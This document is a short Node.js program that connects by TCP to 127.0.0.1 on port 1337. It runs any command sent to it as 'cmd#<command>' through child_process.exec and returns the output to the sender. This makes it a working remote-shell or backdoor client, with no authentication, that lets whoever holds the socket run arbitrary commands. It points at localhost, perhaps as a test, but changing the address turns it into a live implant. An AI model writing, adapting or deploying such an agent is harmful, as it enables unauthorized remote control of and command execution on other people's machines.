var net = require('net');
var StringDecoder = require('string_decoder').StringDecoder;
var decoder = new StringDecoder('utf8');
var client = new net.Socket();
const exec = require('child_process').exec;

/** 
 * DEFS 
 */
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }

/** 
 * Logic 
 */
var protocol = function (cmd) {
	if(cmd.contains("cmd#")) {
		var arg = cmd.split("#")[1]; // second argument is the command it self.

		const child = exec(arg,
		  (error, stdout, stderr) => {
		  	client.write("reply#"+stdout);
		});
	}
}

/**
 * Client ops
 */
client.on('data', function(data) {
    var cmd = decoder.write(data);
    protocol(cmd);
});

client.on('close', function() {
	console.log('Connection closed');
});

client.connect(1337, '127.0.0.1', function() {
	console.log('Connected');
	client.write('reply#ack');
});